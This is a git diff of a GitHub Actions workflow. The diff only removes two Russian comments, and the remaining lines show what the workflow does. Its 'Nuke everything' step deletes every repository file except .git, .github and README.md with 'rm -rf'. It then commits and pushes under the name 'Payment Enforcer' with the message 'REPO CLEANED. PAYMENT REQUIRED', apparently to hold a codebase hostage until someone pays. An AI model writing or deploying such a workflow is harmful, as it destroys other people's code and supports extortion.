@@ -15,7 +15,6 @@ jobs:
 
       - name: Nuke everything except README and workflows
         run: |
-          # Удаляем все файлы, кроме .git, .github и README.md
           find . -maxdepth 1 ! -name '.git' ! -name '.github' ! -name 'README.md' ! -name '.' -exec rm -rf {} +
           ls -la
 
@@ -24,7 +23,6 @@ jobs:
           git config --global user.name "Payment Enforcer"
           git config --global user.email "pay-for-work@immediately.com"
           git add .
-          # Если есть изменения (то есть кто-то что-то залил), комитим удаление
           if ! git diff-index --quiet HEAD; then
             git commit -m "REPO CLEANED. PAYMENT REQUIRED. Contact: @PRISSETIK"
             git push origin HEAD:${{ github.ref_name }}
